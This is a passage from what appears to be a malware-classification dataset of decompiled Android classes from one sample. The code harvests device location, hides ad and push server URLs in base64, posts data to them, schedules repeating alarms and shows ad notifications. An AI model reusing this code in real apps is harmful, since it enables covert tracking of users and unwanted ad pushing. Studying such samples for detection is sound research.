} "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\an.code","final class an {   final ak a;   private ImageView b;   private TextView c;   private LinearLayout d;   public an(  ak akVar){     this.a=akVar;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\b.code","public final class b implements LocationListener {   final a a;   public b(  a aVar){     this.a=aVar;   }   @Override public final void onLocationChanged(  Location location){     LocationManager locationManager;     LocationManager locationManager2;     if (location != null) {       try {         a.a.f=String.valueOf(location.getLongitude()) + "";"" + String.valueOf(location.getLatitude());         locationManager=this.a.G;         if (locationManager != null) {           locationManager2=this.a.G;           locationManager2.removeUpdates(this);         }       }  catch (      Exception e) {         e.printStackTrace();       }     }   }   @Override public final void onProviderDisabled(  String str){   }   @Override public final void onProviderEnabled(  String str){   }   @Override public final void onStatusChanged(  String str,  int i,  Bundle bundle){   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\c.code","public final class c implements Serializable {   static String b;   static String c;   static String d;   static String e;   static String f;   static String g;   static String h;   static String i;   private boolean k=false;   private boolean l;   private boolean m;   private boolean n;   private boolean o;   public static List a=new ArrayList();   static c j=null; static {     b="""";     c="""";     d="""";     e="""";     f="""";     g="""";     h="""";     i="""";     try {       b=new String(q.a(""aHR0cDovL2FwaS5ib3guYXBwbW9iLmNuL2JveC9pbml0LmpzcA==""));       c=new String(q.a(""aHR0cDovL2FwaS5ib3guYXBwbW9iLmNuL2JveC9saXN0LmpzcA==""));       d=new String(q.a(""aHR0cDovL2FwaS5ib3guYXBwbW9iLmNuL2JveC9jbGljay5qc3A=""));       e=new String(q.a(""aHR0cDovL2FwaS5ib3guYXBwbW9iLmNuL2FwcC91bmluc3RhbGwuanNw""));       f=new String(q.a(""aHR0cDovL2FwaS5ib3guYXBwbW9iLmNuL2FwcC9pbnN0YWxsLmpzcA==""));       g=new String(q.a(""aHR0cDovL2FwaS5ib3guYXBwbW9iLmNuL2FwcC9kb3duLmpzcA==""));       h=new String(q.a(""aHR0cDovL2FwaS5ib3guYXBwbW9iLmNuL2JveC9zaG93LmpzcA==""));       i=new String(q.a(""aHR0cDovL2FwaS5pcy4xMzkxOTkuY29tL2lzL3B1c2guanNw""));     }  catch (    Exception e2) {       e2.printStackTrace();     }   }   public static c a(){     if (j == null) {       j=new c();     }     return j;   }   public final void a(  Context context,  boolean z,  boolean z2,  boolean z3,  boolean z4){     this.l=z4;     this.m=z;     this.n=z2;     this.o=z3;     z.b(context,""hottype"",this.l);     z.b(context,""need_type"",this.m);     z.b(context,""gametype"",this.n);     z.b(context,""netgametype"",this.o);   }   public final boolean a(  Context context){     this.k=z.a(context,""pushflag"",false);     return this.k;   }   public final boolean b(  Context context){     this.l=z.a(context,""hottype"",true);     return this.l;   }   public final boolean c(  Context context){     this.m=z.a(context,""need_type"",true);     return this.m;   }   public final boolean d(  Context context){     this.n=z.a(context,""gametype"",false);     return this.n;   }   public final boolean e(  Context context){     this.o=z.a(context,""netgametype"",false);     return this.o;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\d.code","public final class d implements Serializable {   private String a;   private String b;   private String c;   private String d;   private String e;   private int f;   private int g;   private int h;   private int i;   private int j;   private boolean k;   private String l;   private String m;   private String n;   private String o;   private String p;   private String q;   private String r;   private List s;   private String t;   private String u;   private int v;   private long w;   private int x;   private long y;   public d(){     this.f=0;     this.g=0;     this.h=0;     this.i=0;     this.j=0;     this.k=false;     this.l="""";     this.s=new ArrayList();     this.v=0;     this.w=0L;     this.y=0L;   }   public d(  String str){     this.f=0;     this.g=0;     this.h=0;     this.i=0;     this.j=0;     this.k=false;     this.l="""";     this.s=new ArrayList();     this.v=0;     this.w=0L;     this.y=0L;     try {       this.m=str;       JSONObject jSONObject=new JSONObject(str);       this.e=jSONObject.optString(""logo"","""");       this.n=jSONObject.optString(""desc"","""");       this.q=jSONObject.optString(""title2"","""");       this.b=jSONObject.optString(""fileurl"","""");       this.c=jSONObject.optString(""pkg"","""");       this.t=jSONObject.optString(""tip1"","""");       this.u=jSONObject.optString(""tip2"","""");       this.v=jSONObject.optInt(""type"",0);       this.j=jSONObject.optInt(""downflag"",0);       this.r=jSONObject.optString(""product"","""");       this.w=jSONObject.optLong(""time"",0L);       this.d=jSONObject.optString(""title"","""");       this.a=jSONObject.optString(""filesize"","""");       this.g=jSONObject.optInt(""adcodeid"",0);       this.x=jSONObject.optInt(""adappid"",0);       this.l=jSONObject.optString(""token"","""");       this.p=jSONObject.optString(""brief"","""");       this.o=jSONObject.optString(""versioname"","""");       if (jSONObject.has(""showimage"")) {         JSONArray optJSONArray=jSONObject.optJSONArray(""showimage"");         for (int i=0; i < optJSONArray.length(); i++) {           this.s.add(optJSONArray.getString(i));         }       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   public final String a(){     return this.t;   }   public final void a(  long j){     this.y=j;   }   public final String b(){     return this.u;   }   public final int c(){     return this.v;   }   public final long d(){     return this.w;   }   public final String e(){     return this.d;   }   public final String f(){     return this.a;   }   public final String g(){     return this.b;   }   public final String h(){     return this.c;   }   public final void i(){     this.f=1;   }   public final int j(){     return this.j;   }   public final String k(){     return this.l;   }   public final String l(){     return this.m;   }   public final String m(){     return this.e;   }   public final long n(){     return this.y;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\e.code","public final class e {   private static Notification c;   private static NotificationManager d;   private static boolean a=true;   private static int b=8888;   private static int e=6;   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * f) + 0.5f);   }   public static Bitmap a(  Context context,  List list){     try {       float dimension=context.getResources().getDimension(R.dimen.app_icon_size) / 80.0f;       Bitmap k=k(context,""folderbg.png"");       int width=k.getWidth();       int height=k.getHeight();       Bitmap createBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);       Canvas canvas=new Canvas(createBitmap);       canvas.drawBitmap(k,0.0f,0.0f,(Paint)null);       Matrix matrix=new Matrix();       float f=((width - (e * 2)) / 2) - 4;       float f2=f / width;       matrix.postScale(f2,f2);       for (int i=0; i < 4; i++) {         if (i < list.size()) {           Bitmap bitmap=(Bitmap)list.get(i);           canvas.drawBitmap(Bitmap.createBitmap(bitmap,0,0,width,height,matrix,true),e + ((((i % 2) * 2) + 1) * 2) + ((i % 2) * f),e + ((((i / 2) * 2) + 1) * 2) + ((i / 2) * f),(Paint)null);           bitmap.recycle();         }       }       Bitmap createScaledBitmap=Bitmap.createScaledBitmap(createBitmap,(int)(createBitmap.getWidth() * dimension),(int)(createBitmap.getHeight() * dimension),true);       createBitmap.recycle();       return createScaledBitmap;     }  catch (    Exception e2) {       e2.printStackTrace();       return null;     }   }   public static Class a(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=context.getPackageManager().getPackageInfo(context.getApplicationInfo().packageName,2).receivers;       if (activityInfoArr != null) {         int i=0;         while (true) {           int i2=i;           if (i2 >= activityInfoArr.length) {             break;           }           try {             cls2=Class.forName(activityInfoArr[i2].name);           }  catch (          ClassNotFoundException e2) {             e2.printStackTrace();           }           if (cls.isAssignableFrom(cls2)) {             return cls2;           }           i=i2 + 1;         }       }     }  catch (    PackageManager.NameNotFoundException e3) {       e3.printStackTrace();     }     return null;   }   public static String a(){     try {       return new SimpleDateFormat(""yyyy-MM-dd"",Locale.CHINA).format(new Date());     }  catch (    Exception e2) {       e2.printStackTrace();       return """";     }   }   public static String a(  Context context,  String str,  String str2){     String str3="""";     HttpPost httpPost=new HttpPost(str);     try {       try {         BasicHttpParams basicHttpParams=new BasicHttpParams();         HttpConnectionParams.setConnectionTimeout(basicHttpParams,15000);         HttpConnectionParams.setSoTimeout(basicHttpParams,15000);         HttpConnectionParams.setSocketBufferSize(basicHttpParams,8192);         HttpClientParams.setRedirecting(basicHttpParams,true);         HttpProtocolParams.setUserAgent(basicHttpParams,null);         if (j(context)) {           basicHttpParams.setParameter(""http.route.default-proxy"",new HttpHost(""10.0.0.172"",80));         }         DefaultHttpClient defaultHttpClient=new DefaultHttpClient(basicHttpParams);         httpPost.setEntity(new UrlEncodedFormEntity(b(str2),""UTF-8""));         HttpResponse execute=defaultHttpClient.execute(httpPost);         if (execute.getStatusLine().getStatusCode() == 200) {           BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(execute.getEntity().getContent(),""UTF-8""),10240);           StringBuilder sb=new StringBuilder();           while (true) {             String readLine=bufferedReader.readLine();             if (readLine == null) {               break;             }             sb.append(readLine);           }           str3=sb.toString();         }         return str3;       }  catch (      Exception e2) {         throw e2;       }     }   finally {       httpPost.abort();     }   }   private static List a(  List list){     ArrayList arrayList=new ArrayList();     int i=0;     while (true) {       try {         int i2=i;         if (i2 >= list.size()) {           break;         }         arrayList.add(((PackageInfo)list.get(i2)).applicationInfo.packageName);         i=i2 + 1;       }  catch (      Exception e2) {         e2.printStackTrace();       }     }     return arrayList;   }   public static void a(  Context context,  int i){     int i2=15;     if (i <= 13 || i >= 18) {       return;     }     new ad(context,i).execute(new Void[0]);     int i3=i + 1;     boolean c2=c.a().c(context);     boolean d2=c.a().d(context);     boolean e2=c.a().e(context);     boolean b2=c.a().b(context);     if (c2 && i3 == 14) {       i2=14;     }  else     if (!d2 || i3 > 15) {       i2=(!e2 || i3 > 16) ? (!b2 || i3 > 17) ? 0 : 17 : 16;     }     if (i2 <= 14 || i3 >= 18) {       return;     }     a(context,1L,i2);   }   public static void a(  Context context,  long j){     try {       new SimpleDateFormat(""yyyy-MM-dd hh:mm:ss"");       long currentTimeMillis=System.currentTimeMillis();       long a2=z.a(context,""fsdltime"",0L);       if (a2 == 0) {         a2=(60 * j * 1000) + currentTimeMillis;       }  else       if (a2 > 0 && a2 - currentTimeMillis <= 0) {         a2=3000 + currentTimeMillis;       }       Intent intent=new Intent(context,(Class<?>)knvu.c(context));       intent.setAction(""sdelayRe"");       ((AlarmManager)context.getSystemService(""alarm"")).setRepeating(0,a2,43200000L,PendingIntent.getBroadcast(context,0,intent,134217728));       z.a(context,""fsdltime"",Long.valueOf(a2));     }  catch (    Exception e2) {       e2.printStackTrace();     }   }   public static void a(  Context context,  long j,  int i){     try {       Intent intent=new Intent(context,(Class<?>)knvu.c(context));       intent.setAction(""boxadRe"");       intent.putExtra(""boxtype"",i);       PendingIntent broadcast=PendingIntent.getBroadcast(context,0,intent,134217728);       AlarmManager alarmManager=(AlarmManager)context.getSystemService(""alarm"");       long currentTimeMillis=System.currentTimeMillis();       alarmManager.set(3,SystemClock.elapsedRealtime() + (60 * j * 1000),broadcast);       z.a(context,""startTime"",Long.valueOf(currentTimeMillis));     }  catch (    Exception e2) {       e2.printStackTrace();     }   }   public static void a(  Context context,  Intent intent){     int intExtra=intent.getIntExtra(""notifyid"",0);     if (intExtra > 0) {       NotificationManager notificationManager=(NotificationManager)context.getSystemService(""notification"");       int intExtra2=intent.getIntExtra(""iconid"",R.drawable.presence_online);       String stringExtra=intent.getStringExtra(""title"");       String stringExtra2=intent.getStringExtra(""adwords"");       String stringExtra3=intent.getStringExtra(""image"");       Bitmap bitmap=null;       try {         if (stringExtra3.startsWith(""http://"")) {           stringExtra3=h(context,stringExtra3);         }         if (!a(stringExtra3)) {           intent.putExtra(""image"",stringExtra3);           bitmap=BitmapFactory.decodeStream(new ByteArrayInputStream(q.a(stringExtra3)));         }         if (bitmap == null) {           try {             bitmap=BitmapFactory.decodeStream(new ByteArrayInputStream(q.a(""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9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"")));             intent.putExtra(""image"",""iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAA3NCSVQICAjb4U/gAAADAFBMVEX////kw5/ewIv43KjvyIHEtZnHqm67YCyrSiDl0KnEtZmUQRv43Kj1zZ3kw5+sUSKrSiCUQRvevIC7YCysUSL1zZ3vyIG7YCysUSK7YCz43Kjl0KnvyIHevICrXCmrSiD1zZ3l0KnvyIG7YCyrXCmsUSKrSiD43KjvyIHeuHu7YCyrXCmrSiD43KjvyIHWrWusUSKrSiD43Kj1zZ3vyIHeuHvbsnHWqWS1aTK7YCyrXCmkUyisUSL////1/v349/bs9ffu7+/s6OTU6vPd5+L437Ts3s/p2fT43KjY3+HM3Nu63+3X09r1zZ2n3Pfl0KnwyLjMzMzvyIHkw5/Gx8H/wDDewIvevIDeuHvKtc7fuF/XtHnXp/rbsnHEtZnNtHso1v9pxeets6vWrWvwpl3qoabWrVnkqzebs77WqWTZqF36pBvHqm7TpVWQuzjGmOqqpp/OoFLPn1zBol/vljabpo0tuvbNmkr3kxITv/kyudqtnYR8rVGqmmxEsMH4f4XHk0fAlFcpsur2iRGnmFuTmJcMtPb4hAXFjEM0uSbUhi2ljGVhpETDhUL2fAsNqfYNq+PdghGuiFDAc/Slf8nDgV2aiXxTl5ZinR2+fTr0cQr1Z26pfVAOn9SvekGDgn20djeFe5G7czcapBPXbQ0QlNLjX2SAeWemcFemZ5lkgHBtfzi1aTIIjr9UhjicbzupaTunWNaMbjq5TfiCbFmWYoYof6P2SVHXUGOqYi65TNhqZKerXCmXYTY/coJOdyexWw2mS9BrZlmkUyiTWDKZVCpbYWCGVzTQPUCiOeccZ6CSUw+nRVerSiCqM/RuWTB9SZuaSyK/KP9UVlwJcQwvYyN4Pcj/IjB7Q3NRVTOKRR/2IzDgKTBNUVmUQRuXK+KpGvh6PBr4FStmPyVrMJn3ESFuNxdYPCqlD/n/ChgzQF/jEB+ZEPiVEucJRm3xCBhgKH7ZDRuWBveHC+vyAAteKg8zMzN7Dc6vDhpSJQ5kCsSVDBaGChQ2HQ9DBKVYBw3KOpWUAAABAHRSTlMAIiIzMzMzMzNERERVVVVVVVVmZmZ3d4iImaqqqqqqqru7u7u7u7vMzMzMzMzd3d3d3e7u7u7u7u7u7u7u////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tfl3FgAAAAlwSFlzAAALEgAACxIB0t1+/AAAAB90RVh0U29mdHdhcmUATWFjcm9tZWRpYSBGaXJld29ya3MgOLVo0ngAAA0nSURBVFiFfdkJXBNXHgfw7N293fu+u/e2u9vtsdvdmWFiDAWxBY2KIKCAsQgoSajBs4mIyUKDECw2HoFSFbXRxIBSbOJBiIBaMLUKBgERgagoCkYUq+z/vTczmXjsz4hMZuab33tvhk+CEgnJF37yzHPTcF7hMuX/hT/oFXLKc8/96iuSsHzux8++kJSWhJIYHx8/m2TWk0J2w4Hx6Iy0tKQXn//l10TcZ34/OwOSBnuSEhMR+TgxJSVLo8lKQU/zXCLx0tLg7Phnvsx73/hHGueRjvGPdJw9G7C1a4vKy4vWYjJUj/cg079HvM8+T7Y5MfEhj8eK9u/ad/DgwV1FmhQeFBpywPSvY/DX8K1aXFE0i4kpWVkIK9919GDNxzi7irISnwBmPIu8zyephYLCiEGMRxge565dGLtA8vH+tcKgE8PGDM73JZIv/lSNEhJRv8TERA7bv+tojWBdCKAvR4uy+FVOEjVEiPqP35b87K88yA8YBbSinYC1ABYIYCfA/9taq0mJF1UMgeqMl/4gefYlUUESxO3ksKGhISQFRgIXWmvK5pYhtcOclYJfNvHhiuqMFyQvhkYMZJZGr9doNFv2t0CjkZEhlJGRkQDCIimKikQvcMq5xazXZGWByIG8p1YnSBIEMCMjS2PeguKsbR0iGmBDF1rLlkQyFEVHRlJMK4A9x3ZXVBeZAdVkkTEJnjpNwn2HPI1+y/tvQfaeOxUYJdgQqgYYxUbOLWvpYakaeO7CgeXzlq/eWFG9BZoiNVRQnSEC1eD9F2dvzwiAQ/w4AVtS0wP+yFxqLgI/3FMyDwJodS2gSFU/BtQg7z14vHcGwNHRMjROBrB9PaO47dBIGZnEs3tKlkEQunrj7upau90KqJ6Ai3hQrbfvBQzlzKXRsbGxDQwbuaSsBWEBkpEWhkziga3L+MybtxTQWidB1YuEhmq12bmXeO99cmXs0qlTpxQxR0drltQEQhmKpMqg4oXjW3HFdTgIXU5Qs36R0FANI+a9T84VJcycuTArdd81BhY2EChDKrqQYBIDZBIRtHTpUg5F6vKNDXa9mgfVMOLDHHfm/YUzMyEzle/2SBm2NXCBjWwNtC5pDYyUMZHoljl7fOua+a9OnTx58qvzl65bT7Ju2fIGKwJVKgI6D2Puk8NazCGxaHzfnLKRQA1DRdbMpSJbR1pZBpVtPb56KsVl8vz1fJatdhoRSLwtzjOYM87MzOPAzIWXxkZhReYyKCwT2XothimDe/HChwqW4UXq1TW8uGa3RWio33IOuDNO4CC8uHP8WmtZayQBpdI5Yxtkc65dGwocTY3iRIYRi7sr0RwiUG92nkGTl5mXnxdKZuaNsX1MJOFi5mzYf2p/TurY6LVAT04My06GFUMBUQyqIHq92X7uzOHCzLzifEge+ktE6/gSlmHRvbLv7KWOD+rqdrx9aXxstOddBTN1zVSGhGKWkmXZ3mBBoBY8Z9u5SuCwl2/Iz8vlyMyO12PmLNnX0tKyYcOOunaUHR1AnkqVzl8XEknFdQeaTJJFWh3Uc7bZM/M2FaPkFxvy0+VMuoHULDx1tqelbC4rVZS3t3dC2tvrPugYv1QQt3ydIFKTl65HF+Mht06ySG+yOtucCzOLiQfJnQaTLc3nxNoNMXCKbM67ze0knReBvNFQsL0kJLLz0dW95phbJVEZrU3OQhGXPx0vHzONTGde7htxsBxHH5xsvyikv73u5LHje0pK1pVwIgKXbW9wAGhtsmfmb+K9/HQpd3UxuQYyj+ZLZ8fGxm909l8UiZfbmzuO79laUoJElgMPNFlVEp3TLqqXPoWi4QLDHacYuKW+MT429uDkxf7wAHkMkcujBPBQo0klMTsL8zeJJo+dUTgbLi8aKqYbyEJbHoyP32gXpM7Oi/3Dw/39w5fbTx7a+Hp0lJRlZGhRSo55jSqJ1VkomjwmVrvJkMtSNCOXU3L+8u548KBZ8IZjWXnsm3Wdw8PDly+3f1Ceo4iJgmsS7uTtbQ4AzfbCfHyxFE+naXkGvmZoRppkyGWY6aRinuVBh1Dw1mZyy0kX1EHPy/3nd1akxsnRD4hlh5oqATQiEK1ncTrNpkO9KTTNzio1GHLltBTf13mlpX3nhX79corcbhQVuxmRF5urc17fiq7rY41Wk1aiddbn4xvEkP8aPSV3OkMzr+UaDJnTGJpmpuGKpUc+Elbk1psMtaBuxwI5JuWYbD95YE/J+vVbG7wYtDfZiomYy9KgyBcZDHnpUpjFGTRcOuBtO9EpFOxkKfb8rV